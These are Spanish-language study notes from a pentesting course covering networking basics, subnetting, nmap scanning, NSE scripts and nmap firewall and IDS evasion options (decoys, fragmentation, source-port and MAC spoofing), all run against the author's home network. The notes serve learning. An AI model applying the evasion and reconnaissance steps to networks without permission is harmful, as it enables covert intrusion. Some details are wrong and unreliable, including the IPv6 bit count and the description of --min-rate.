
*Direcciones IP*
```
❯ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.134  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::be24:11ff:fe8a:9695  prefixlen 64  scopeid 0x20<link>
        ether bc:24:11:8a:96:95  txqueuelen 1000  (Ethernet)
        RX packets 22387  bytes 1366035 (1.3 MiB)
        RX errors 0  dropped 2  overruns 0  frame 0
        TX packets 8148  bytes 64662076 (61.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 11  bytes 917 (917.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11  bytes 917 (917.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

❯ hostname -I
192.168.1.134
❯ echo "$(echo "obase=2; 192" |bc).168.1.134"
11000000.168.1.134
-----------------
Pasado en binario
-----------------
❯ echo "$(echo "obase=2; 192" |bc).$(echo "obase=2; 168" |bc).$(echo "obase=2; 1" | bc).$(echo "obase=2; 134" | bc)"
11000000.10101000.1.10000110
------------------------------
total direccion IPV4 -> 32bits
------------------------------
echo "2^32" | bc
4294967296
------------------------------
total direccion IPV6 -> 64bits
------------------------------
❯ echo "2^128" | bc
340282366920938463463374607431768211456
```

www.countrymeters.info -> Población mundial: 8.039.699.386 (la mitad de ip asignables en ipv4) 

*Dirección MAC*
MAC: identificador de 48bits que corresponden de forma única a una tarjeta de red. Dirección física. "Es única". Herramientas como macchangle que te permiten cambiar o manipular.
Ejemplo:
ether 00:0C:29 : e1:6d:92
IEEE =    OUI   +     NIC    
OUI: Organizator Unique Identifier
NIC: Network Interface Controler especific

```
❯ sudo arp-scan -I eth0 --localnet
Interface: eth0, type: EN10MB, MAC: bc:24:11:8a:96:95, IPv4: 192.168.1.134
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	cc:d4:a1:8e:7f:0d	(Unknown)
192.168.1.35	00:68:eb:53:65:5f	(Unknown)
192.168.1.56	6c:0b:84:aa:fe:e3	(Unknown)
192.168.1.57	5c:85:7e:46:21:1f	(Unknown)
192.168.1.61	54:42:49:13:a6:6d	(Unknown)
192.168.1.82	bc:24:11:ee:a8:51	(Unknown)
192.168.1.95	bc:24:11:1b:07:a7	(Unknown)
192.168.1.113	bc:24:11:c8:f9:8e	(Unknown)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.877 seconds (136.39 hosts/sec). 8 responded
```

Las direcciones IPv4 se representan como cuatro números separados por puntos, como **192.168.0.1**, mientras que las direcciones IPv6 se representan en notación hexadecimal y se separan por dos puntos, como **2001:0db8:85a3:0000:0000:8a2e:0370:7334**.

*TCP/UDP*
TCP: protocolo orientado para conexión (internet)
UDP: protocolo sin conexión (sin comprobar si recibe o hay errores, streaming)

TCP (Three-way handshake) -------> SYN ---------> SYN-ACK -----------> ACK (se sincroniza los números de secuencias y de reconocimientos de paquetes entre dispositivos)

SYN -> Parte que comienza la conversación
SYN-ACK -> La otra parte
ACK (acknoledge) -> Dar a conocer que se ha recibido, respuesta
SYN-SYNACK-ACK -> three-way handsack 

```
❯ wireshark &> /dev/null & disown
[1] 6039
```

![[Pasted image 20240711120305.png]]

*Puertos = 65535* puertos para utilizar:

			21-> FTP
			22-> SSH
			23-> Telnet
			25-> SMTP
	TCP      53-> DNS
			80-> HTTP
			443-> HTTPS
			110-> POP3
			139,445-> SMB
			143-> IMAP


			53-> DNS
	UDP      69-> TFTP
			161-> SNMP

HTTPD : demon


*MODELO OSI*
1. Capa física
2. Capa de enlace de datos
3. Capa de red (IP,paquetes,notas)
4. Capa de transporte (TCP/UDP)
5. Capa de sesión
6. Capa de presentación (cifrados, copresion, codificación)
7. Capa de aplicación (HTTP,FTP, etc)


*SUBNETTING*
**Subnetting** es una técnica utilizada para dividir una red IP en subredes más pequeñas y manejables. Esto se logra mediante el uso de **máscaras de red**, que permiten definir qué bits de la dirección IP corresponden a la **red** y cuáles a los **hosts**.

Para interpretar una máscara de red, se deben identificar los bits que están en “**1**“. Estos bits representan la porción de la dirección IP que corresponde a la **red**. Por ejemplo, una máscara de red de **255.255.255.0** indica que los primeros **tres octetos** de la dirección IP corresponden a la **red**, mientras que el **último octeto** se utiliza para identificar los **hosts**.

Ahora bien, cuando hablamos de **CIDR** (acrónimo de **Classless Inter-Domain Routing**), a lo que nos referimos es a un método de asignación de direcciones IP más eficiente y flexible que el uso de clases de redes IP fijas. Con **CIDR**, una dirección IP se representa mediante una dirección IP base y una máscara de red, que se escriben juntas separadas por una barra (**/**).

Por ejemplo, la dirección IP **192.168.1.1** con una máscara de red de **255.255.255.0** se escribiría como **192.168.1.1/24**.

La máscara de red se representa en notación de prefijo, que indica el número de bits que están en “**1**” en la máscara. En este caso, la máscara de red **255.255.255.0** tiene **24** bits en “**1**” (los primeros tres octetos), por lo que su notación de prefijo es **/24**.

Para calcular la máscara de red a partir de una notación de prefijo, se deben escribir los bits “**1**” en los primeros bits de una dirección IP de 32 bits y los bits “**0**” en los bits restantes. Por ejemplo, la máscara de red **/24** se calcularía como **11111111.11111111.11111111.00000000** en binario, lo que equivale a **255.255.255.0** en decimal.


*CIDR*
En cuanto a clases de direcciones IP, existen tres tipos de máscaras de red: **Clase A**, **Clase B** y **Clase C**.

- Las redes de **clase A** usan una máscara de subred predeterminada de **255.0.0.0** y tienen de **0** a **127** como su **primer octeto**. La dirección **10.52.36.11**, por ejemplo, es una dirección de **clase A**. Su primer octeto es **10**, que está entre **1** y **126**, ambos incluidos.
- Las redes de **clase B** usan una máscara de subred predeterminada de **255.255.0.0** y tienen de **128** a **191** como su **primer octeto**. La dirección **172.16.52.63**, por ejemplo, es una dirección de **clase B**. Su primer octeto es **172**, que está entre **128** y **191**, ambos inclusive.
- Las redes de **clase C** usan una máscara de subred predeterminada de **255.255.255.0** y tienen de **192** a **223** como su **primer octeto**. La dirección **192.168.123.132**, por ejemplo, es una dirección de **clase C**. Su primer octeto es **192**, que está entre **192** y **223**, ambos incluidos.

Es importante tener en cuenta que, además de estos tres tipos de máscaras de red, **también existen máscaras de red personalizadas** que se pueden utilizar para crear subredes de diferentes tamaños dentro de una red.

Tal y como mencionamos en la descripción de la clase anterior sobre los CIDRs (**Classless Inter-Domain Routing**), se trata de un método de asignación de direcciones IP que permite dividir una dirección IP en una parte que identifica **la red** y otra parte que identifica **el host**. Esto se logra mediante el uso de una **máscara de red**, que se representa en notación **CIDR** como una **dirección IP base** seguida de un número que indica la **cantidad de bits** que corresponden a la red.

Con **CIDR**, se pueden asignar direcciones IP de forma **más precisa**, lo que reduce la cantidad de direcciones IP desperdiciadas y facilita la administración de la red.

El número que sigue a la dirección IP base en la notación CIDR se llama **prefijo** o **longitud de prefijo**, y representa el **número de bits** en la máscara de red que están en “**1**“.

Por ejemplo, una dirección IP con un prefijo de **/24** indica que los primeros **24 bits** de la dirección IP corresponden a la **red**, mientras que los **8 bits** restantes se utilizan para identificar los **hosts**.

Para calcular la cantidad de hosts disponibles en una red CIDR, se deben contar el número de bits “**0**” en la máscara de red y elevar **2 a la potencia** de ese número. Esto se debe a que cada bit “**0**” en la máscara de red representa un bit que se puede utilizar para identificar un host.

Por ejemplo, una máscara de red de **255.255.255.0** (**/24**) tiene **8 bits** en “**0**“, lo que significa que hay **2^8 = 256** direcciones IP disponibles para los hosts en esa red.

A continuación, se representan algunos ejemplos prácticos de CIDR:

- Una dirección IP con un prefijo de **/28** (**255.255.255.240**) permite hasta **16 direcciones IP** para los hosts (**2^4**), ya que los primeros **28 bits** corresponden a la red.
- Una dirección IP con un prefijo de **/26** (**255.255.255.192**) permite hasta **64 direcciones IP** para los hosts (**2^6**), ya que los primeros **26 bits** corresponden a la red.
- Una dirección IP con un prefijo de **/22** (**255.255.252.0**) permite hasta **1024 direcciones IP** para los hosts (**2^10**), ya que los primeros **22 bits** corresponden a la red.

![[Pasted image 20240711121823.png|700]]

*Adjunto excel con relación de subredes y mascaras con su correspondiente calcula:*
![[Subnetting.xlsx]] 
- [https://www.ipaddressguide.com/cidr](https://www.ipaddressguide.com/cidr)

Ejemplo:
![[Pasted image 20240711173851.png]]

![[Pasted image 20240711173916.png]]

*NMAP y modos de escaneo*
**Nmap** es una herramienta de **escaneo de red** gratuita y de código abierto que se utiliza en pruebas de penetración (pentesting) para explorar y auditar redes y sistemas informáticos.

Con Nmap, los profesionales de seguridad pueden identificar los **hosts** conectados a una red, los **servicios** que se están ejecutando en ellos y las **vulnerabilidades** que podrían ser explotadas por un atacante. La herramienta es capaz de detectar una amplia gama de dispositivos, incluyendo enrutadores, servidores web, impresoras, cámaras IP, sistemas operativos y otros dispositivos conectados a una red.

Asimismo, esta herramienta posee una variedad de funciones y características avanzadas que permiten a los profesionales de seguridad adaptar la misma a sus necesidades específicas. Estas incluyen técnicas de escaneo agresivas, capacidades de scripting personalizadas, y un conjunto de herramientas auxiliares que pueden ser utilizadas para obtener información adicional sobre los hosts objetivo.

```
❯ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0
192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0
❯ nmap -p1-65535 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 17:52 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0011s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    filtered ftp
22/tcp    open     ssh
23/tcp    filtered telnet
80/tcp    open     http
443/tcp   open     https
1990/tcp  filtered stun-p1
7547/tcp  filtered cwmp
16667/tcp open     unknown
44401/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
❯ nmap -p- 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 17:53 CEST
Nmap scan report for 192.168.1.1
Host is up (0.015s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
21/tcp    filtered ftp
22/tcp    open     ssh
23/tcp    filtered telnet
80/tcp    open     http
443/tcp   open     https
1990/tcp  filtered stun-p1
7547/tcp  filtered cwmp
16667/tcp open     unknown
44401/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
```

open-filtered(no se sabe si esta abierto o cerrado)-close(si no aparece en el listado)

```❯ nmap --top-ports 500 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 17:57 CEST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 58.40% done; ETC: 17:57 (0:00:01 remaining)
Nmap scan report for 192.168.1.1
Host is up (0.033s latency).
Not shown: 495 closed tcp ports (conn-refused)
PORT    STATE    SERVICE
21/tcp  filtered ftp
22/tcp  open     ssh
23/tcp  filtered telnet
80/tcp  open     http
443/tcp open     https

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds

❯ nmap --top-ports 500 --open 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 17:58 CEST
Nmap scan report for 192.168.1.1
Host is up (0.040s latency).
Not shown: 495 closed tcp ports (conn-refused), 2 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds

------------------------------------
Con -v de verbose te va reportando
------------------------------------
❯ nmap --top-ports 500 --open 192.168.1.1 -v
...
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds
```

![[Pasted image 20240711180619.png]]

```
man nmap
❯ nmap --top-ports 500 --open 192.168.1.1 -v -n
---------------------------------------------
de esta manera no te reportará resolución dns
---------------------------------------------
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds

-------------------------------------------------------------------------------------
Con parámetro T0/1/2/3/4 o 5 le indicas lo rápido que quieres que vaya el escaneo
El T0 es lento y paranoico y T5 es loco a cuanto más rápido más rápido pero más ruido
-------------------------------------------------------------------------------------
❯ nmap -p- -T5 --open 192.168.1.1 -v -n
-----------------------------------
Si ya sabemos que puerto est abierto
------------------------------------
❯ nmap -p22,80 -sV 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 18:17 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0022s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
80/tcp open  http       micro_httpd

---------
Para udp
---------
❯ nmap -p- --open -sU 192.168.1.1 -v -n -Pn
```


*Tecnicas de evasión de Firewalls (MTU, Data Length, Source Port, Decoy*

Cuando se realizan pruebas de penetración, uno de los mayores desafíos es evadir la detección de los **Firewalls**, que son diseñados para proteger las redes y sistemas de posibles amenazas. Para superar este obstáculo, Nmap ofrece una variedad de técnicas de evasión que permiten a los profesionales de seguridad realizar escaneos sigilosos y evitar así la detección de los mismos. Pueden aparecer puertos como filtrados o no aparecer por el tema Firewalls.

Algunos de los parámetros vistos en esta clase son los siguientes:

- **MTU (–mtu)**: La técnica de evasión de **MTU** o “**Maximum Transmission Unit**” implica ajustar el tamaño de los paquetes que se envían para evitar la detección por parte del Firewall. Nmap permite configurar manualmente el tamaño máximo de los paquetes para garantizar que sean lo suficientemente pequeños para pasar por el Firewall sin ser detectados.
- **Data Length (–data-length)**: Esta técnica se basa en ajustar la **longitud de los datos** enviados para que sean lo suficientemente cortos como para pasar por el Firewall sin ser detectados. Nmap permite a los usuarios configurar manualmente la longitud de los datos enviados para que sean lo suficientemente pequeños para evadir la detección del Firewall.
- **Source Port (–source-port)**: Esta técnica consiste en configurar manualmente el número de **puerto de origen** de los paquetes enviados para evitar la detección por parte del Firewall. Nmap permite a los usuarios especificar manualmente un puerto de origen aleatorio o un puerto específico para evadir la detección del Firewall.
- **Decoy (-D)**: Esta técnica de evasión en Nmap permite al usuario enviar **paquetes falsos** a la red para confundir a los sistemas de detección de intrusos y evitar la detección del Firewall. El comando **-D** permite al usuario enviar paquetes falsos junto con los paquetes reales de escaneo para ocultar su actividad.
    
- **Fragmented (-f)**: Esta técnica se basa en **fragmentar los paquetes** enviados para que el Firewall no pueda reconocer el tráfico como un escaneo. La opción **-f** en Nmap permite fragmentar los paquetes y enviarlos por separado para evitar la detección del Firewall.
- **Spoof-Mac (–spoof-mac)**: Esta técnica de evasión se basa en **cambiar la dirección MAC** del paquete para evitar la detección del Firewall. Nmap permite al usuario configurar manualmente la dirección MAC para evitar ser detectado por el Firewall.
- **Stealth Scan (-sS)**: Esta técnica es una de las más utilizadas para realizar escaneos sigilosos y evitar la detección del Firewall. El comando **-sS** permite a los usuarios realizar un escaneo de tipo **SYN** **sin establecer una conexión completa**, lo que permite evitar la detección del Firewall.
- **min-rate (–min-rate)**: Esta técnica permite al usuario **controlar la velocidad de los paquetes** enviados para evitar la detección del Firewall. El comando **–min-rate** permite al usuario reducir la velocidad de los paquetes enviados para evitar ser detectado por el Firewall.

Es importante destacar que, además de las técnicas de evasión mencionadas anteriormente, existen muchas otras opciones en Nmap que pueden ser utilizadas para realizar pruebas de penetración efectivas y evadir la detección del Firewall. Sin embargo, las técnicas que hemos mencionado son algunas de las más populares y ampliamente utilizadas por los profesionales de seguridad para superar los obstáculos que presentan los Firewalls en la realización de pruebas de penetración.

```
❯ man nmap
----
/-f   (buscamos parametro -f. Para buscar algo /"parametro a buscar")
----
 -f; --mtu <val>: fragment packets (optionally w/given MTU)
```


*Fragmentados -f*

Por una parte nmap y por otra todo ese tráfico de paquetes tcp lo capturamos y guardamos en archivo Captura.cap
![[Pasted image 20240713191040.png]]

Paramos el escaneo y abrimos este fichero con wireshark:
```
 ❯ wireshark Captura.cap &> /dev/null & disown 
```

Dentro de wireshark (ip.flags.mf == 1)-> para que solo me muestre paquetes 

![[Pasted image 20240716190254.png]]

Está reensamblado en la llamada no. 75:
![[Pasted image 20240716190418.png]]
```
Tambien podriamos haber buscado por tcp.port==22
```

```
nmap --help

--------------------------
Si buscamos por /firewalls
--------------------------
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
  --data <hex string>: Append a custom payload to sent packets
  --data-string <string>: Append a custom ASCII string to sent packets
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum

```

*MTU (–mtu)* -> multiplos de 8
```
❯ nmap -p22 192.168.1.1 --mtu 8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 19:15 CEST
Nmap scan report for 192.168.1.1
Host is up (0.021s latency).

PORT   STATE    SERVICE
22/tcp filtered ssh
MAC Address: 78:29:ED:2C:86:D8 (Askey Computer)

Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
```

**Decoy (-D)** -> Tantas direcciones como quieras
```
nmap --top-ports 500 192.168.1.1 -D 192.168.1.2,192.168.1.3,192.168.1.4,192.168.1.5,192.168.1.6,192.168.1.7,192.168.1.8,192.168.1.9,192.168.1.10,192.168.1.11 -v -n
```

![[Pasted image 20240716193133.png]]

En Sources podemos ver un moton de ips ,¿Cual es la de origen?
![[Pasted image 20240716193337.png]]

Al enviar los paquetes en wireshark se ve que el puerto que utiliza es aleatorio ,nmap (en este caso 45365)
![[Pasted image 20240716193718.png]]

*Source Port (–source-port)* ->cambiar el puerto desde donde se envian los paquetes. Muchas veces hay puertos que estan en la lista negra.
```
-p22 192.168.1.1 --open -T5 -v -n --source-port 53
```

![[Pasted image 20240716194727.png]]

Aquí vemos el puerto de origen 53:

![[Pasted image 20240716194913.png]]

**Data Length (–data-length)** -> Algunos firewalls tienen en lista negra paquetes de determinado tamaño, por ser de herramientas. Sumando determinadas cantidades al lenght
```
nmap -p22 192.168.1.1 --data-length 21
```

![[Pasted image 20240716195617.png]]

Hay vemos la longitud del paquete manipulado:

![[Pasted image 20240716195800.png]]

**Spoof-Mac (–spoof-mac)**
```
nmap -p22 192.168.1.1 --spoof-mac Dell

--------------------------------------------------------------------------------------------------
Se parará el escaneo por que el host está dado de baja, como le hemos cambiado el nombre de la MAC
--------------------------------------------------------------------------------------------------
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 20:00 CEST
Spoofing MAC address 00:00:97:04:15:38 (Dell EMC)
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 1.59 seconds

----------------------------------------------
con parametro -Pn no lo toma como dado de baja
----------------------------------------------
nmap -p22 192.168.1.1 --spoof-mac Dell -Pn
```

En el caso anterior, Dell, al no estar configurado dentro de la red, aún poniendo el parámetro -Pn no procede pero si en el router estuviese configurado alguna lista de dispositivos:
```
-----------------------
listado de dispositivos
-----------------------
❯ arp-scan -I ens33 --localnet
Interface: ens33, type: EN10MB, MAC: 00:0c:29:6f:4d:83, IPv4: 192.168.1.40
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1	78:29:ed:2c:86:d8	ASKEY COMPUTER CORP
192.168.1.60	28:ee:52:05:f8:f6	TP-LINK TECHNOLOGIES CO.,LTD.
192.168.1.74	10:68:38:1e:8a:9b	AzureWave Technology Inc.

------------------------------------
Poniedole una de las direcciones MAC
------------------------------------
❯ nmap -p22 192.168.1.1 --spoof-mac 10:68:38:1e:8a:9b -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 20:07 CEST
Spoofing MAC address 10:68:38:1E:8A:9B (No registered vendor)
Nmap done: 1 IP address (0 hosts up) scanned in 1.56 seconds
```
En el caso anterior tampoco por no tener en mi router de casa configurado ningún dispositivo, pero sería así.

**Stealth Scan (-sS)** **min-rate** ->5000 min-rate está bien
```
nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.1.1

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
16667/tcp open  unknown
40005/tcp open  unknown
MAC Address: 78:29:ED:2C:86:D8 (Askey Computer)
```

Para escaneo completo; sS (resolución RST, agiliza el escaneo, min-rate 5000), (total de paquetes que quieres tramitar), v de verbose, n para que no aplique resolucíon de DNS y -Pn para que no valide que ip esta activo, más rápido.


Normalmente los paquetes son SYN>SYN/ACK>SYN pero en el caso de SYN>SYN/ACK>RST no dejan traza, muchos firewall registran los logs cuando se cierra, y de esta forma no.

![[Pasted image 20240716210130.png]]

![[Pasted image 20240716210158.png]]


*----------------------------------------------------------------------------*
**# Uso de scripts y categorías en nmap para aplicar reconocimiento**
*----------------------------------------------------------------------------*
Una de las características más poderosas de **Nmap** es su capacidad para automatizar tareas utilizando **scripts personalizados**. Los scripts de Nmap permiten a los profesionales de seguridad automatizar las tareas de reconocimiento y descubrimiento en la red, además de obtener información valiosa sobre los sistemas y servicios que se están ejecutando en ellos. El parámetro **–script** de Nmap permite al usuario seleccionar un conjunto de scripts para ejecutar en un objetivo de escaneo específico.

Existen diferentes categorías de scripts disponibles en Nmap, cada una diseñada para realizar una tarea específica. Algunas de las categorías más comunes incluyen:

- **default**: Esta es la categoría predeterminada en Nmap, que incluye una gran cantidad de scripts de reconocimiento básicos y útiles para la mayoría de los escaneos.
- **discovery**: Esta categoría se enfoca en descubrir información sobre la red, como la detección de hosts y dispositivos activos, y la resolución de nombres de dominio.
- **safe**: Esta categoría incluye scripts que son considerados seguros y que no realizan actividades invasivas que puedan desencadenar una alerta de seguridad en la red.
- **intrusive**: Esta categoría incluye scripts más invasivos que pueden ser detectados fácilmente por un sistema de detección de intrusos o un Firewall, pero que pueden proporcionar información valiosa sobre vulnerabilidades y debilidades en la red.
- **vuln**: Esta categoría se enfoca específicamente en la detección de vulnerabilidades y debilidades en los sistemas y servicios que se están ejecutando en la red.

En conclusión, el uso de scripts y categorías en Nmap es una forma efectiva de automatizar tareas de reconocimiento y descubrimiento en la red. El parámetro **–script** permite al usuario seleccionar un conjunto de scripts personalizados para ejecutar en un objetivo de escaneo específico, mientras que las diferentes categorías disponibles en Nmap se enfocan en realizar tareas específicas para obtener información valiosa sobre la red.

Todos los scripts que podemos usar de nmap, están programados en lua
```
❯ locate .nse
```

Y un montón más:
![[Pasted image 20240716210524.png]] 

Total de 605 scripts
```
❯ locate .nse | wc -l
605
```

Para utilizar los scripts más utilizados en nmap, es el script más generalista:
```
❯ nmap -p22 192.168.1.1 -sC -sV
sería lo mismo -sCV (los dos en uno)
```

Otros scripts populares:

Se utiliza para auditar un ftp -> para el tema de usuario annonymous.
```
❯ locate ftp-anon.nse
/usr/share/nmap/scripts/ftp-anon.nse
```

Se utiliza para validar robots.txt -> te reporta por consola rutas.
```
❯ locate http-robots.txt.nse
/usr/share/nmap/scripts/http-robots.txt.nse
```

Para ver las tripas de los scripts programados en lua , normalmente está estructurado en -> Descripción-reglas-acción
![[Pasted image 20240716211701.png]]

Para ver los scripts por categorias:
```
❯ locate .nse | xargs grep "categories"
```
![[Pasted image 20240716212252.png]]

Si quisiesemos filtras por el nombre de categoría (grepear por categoría, lo que está solo entre comillas y que no se repita )
```
❯ locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
```

En total son 14 categorías:
```
❯ locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
14
```

Para que el rastreo no sea muy intrusivo y no se tense, en vez de lanzar script de una categoría (muy intrusivo), lanzaremos checkers (combinación de varias categorias)-> and /or
```
nmap -p22 192.168.1.1 --script="vuln and safe"
```


Ejemplo de usar un script para fuzzing (fuerz bruta de diccionario con lista de rutas):

![[Pasted image 20240716214107.png]]
![[Pasted image 20240716215503.png]]

```
❯ nmap -p80 192.168.1.40 --script http-enum
```

![[Pasted image 20240716215800.png]]

Vamos a interceptarlo a nivel de máquina local (lo) al ser una busqueda en mi propio ordenador, para verlo en wireshark (esta vez no en formato interfaz, sino por consola) 
![[Pasted image 20240716220956.png]]

Ver la peticiones por tshark (consola):
```
tshark -r Captura.cap 2>/dev/null
```

Para filtrar por peticiones en http y que sean GET y buscar por payload en wireshark -> Para finalmente pasarlo de hexadecimal a normal y contar todas las rutas que prueba el script:
```
❯ tshark -r Captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | awk '{print $2}' | sort -u | wc -l
2248
```

```
❯ tshark -r Captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r 

DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
GET /sitecore/shell/sitecore.version.xml HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
Connection: close
Host: 192.168.1.40

<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>
```


*----------------------------------------------------------*
**# Creación de tus propios scripts en Lua para nmap**
*----------------------------------------------------------*

Nmap permite a los profesionales de seguridad personalizar y extender sus capacidades mediante la creación de scripts personalizados en el lenguaje de programación **Lua**. Lua es un lenguaje de scripting simple, flexible y poderoso que es fácil de aprender y de usar para cualquier persona interesada en crear scripts personalizados para Nmap.

Para utilizar Lua como un script personalizado en Nmap, es necesario tener conocimientos básicos del lenguaje de programación Lua y comprender la estructura básica que debe tener el script. La estructura básica de un script de Lua en Nmap incluye la definición de una tabla, que contiene diferentes campos y valores que describen la funcionalidad del script.

Los campos más comunes que se definen en la tabla de un script de Lua en Nmap incluyen:

- **description**: Este campo se utiliza para proporcionar una descripción corta del script y su funcionalidad.
- **categories**: Este campo se utiliza para especificar las categorías a las que pertenece el script, como descubrimiento, explotación, enumeración, etc.
- **author**: Este campo se utiliza para identificar al autor del script.
- **license**: Este campo se utiliza para especificar los términos de la licencia bajo la cual se distribuye el script.
- **dependencies**: Este campo se utiliza para especificar cualquier dependencia de biblioteca o software que requiera el script para funcionar correctamente.
- **actions**: Este campo se utiliza para definir la funcionalidad específica del script, como la realización de un escaneo de puertos, la detección de vulnerabilidades, etc.

Una vez que se ha creado un script de Lua personalizado en Nmap, se puede invocar utilizando el parámetro **–script** y el nombre del archivo del script. Con la creación de scripts personalizados en Lua, es posible personalizar aún más las capacidades de Nmap y obtener información valiosa sobre los sistemas y servicios en la red.

```
> example.nse
```

```
-- HEAD --                                                                                               descrption= [[             
Script de ejemplo que enumera y reporta puertos abiertos por TCP                                            ]]  

-- RULE --  

portrule = function(host, port)                                                                 
  return port.protocol == "tcp"                                                                                 and port.state == "open"                                                                             end
                                                                                                            -- ACTION -- 
                                                                                                 
action = function(host, port)                                                                   
  return "This port is open"                                                                                end 
```


```
------------------------------------------
`pwd` + tab -> te aparece la ruta absoluta
------------------------------------------
❯ nmap --script /home/k4rma/Desktop/k4rma/Academia/example.nse -p22,80 192.168.1.1
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-17 18:27 CEST
Nmap scan report for 192.168.1.1
Host is up (0.015s latency).

PORT   STATE SERVICE
22/tcp open  ssh
|_example: This port is open
80/tcp open  http
|_example: This port is open
MAC Address: 78:29:ED:2C:86:D8 (Askey Computer)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```


*----------------------------------------------------------------------------------------*
**#Alternativas para la enumeración de puertos usando descriptores de archivo**
*----------------------------------------------------------------------------------------*
La enumeración de puertos es una tarea crucial en las pruebas de penetración y seguridad de redes. Tal y como hemos visto, Nmap es una herramienta de línea de comandos ampliamente utilizada para esta tarea, pero existen alternativas para realizar la enumeración de puertos de manera efectiva sin utilizar herramientas externas.

Una alternativa a la enumeración de puertos utilizando herramientas externas es aprovechar el poder de los **descriptores de archivo** en sistemas **Unix**. Los descriptores de archivo son una forma de acceder y manipular archivos y dispositivos en sistemas Unix. En particular, la utilización de **/dev/tcp** permite la conexión a un host y puerto específicos como si se tratara de un archivo en el sistema.

Para realizar la enumeración de puertos utilizando **/dev/tcp** en Bash, es posible crear un script que realice una conexión a cada puerto de interés y compruebe si el puerto está abierto o cerrado en función de si se puede enviar o recibir datos. Una forma de hacer esto es mediante el uso de comandos como “**echo**” o “**cat**“, aplicando redireccionamientos al **/dev/tcp**. El código de estado devuelto por el comando se puede utilizar para determinar si el puerto está abierto o cerrado.

Aunque esta alternativa puede ser menos precisa y más lenta que el uso de herramientas especializadas como Nmap, es una opción interesante y viable para aquellos que buscan una solución rápida y sencilla para la enumeración de puertos en sistemas Unix. Además, este enfoque puede proporcionar una mejor comprensión de cómo funcionan los descriptores de archivo en los sistemas Unix y cómo se pueden utilizar para realizar tareas de red.

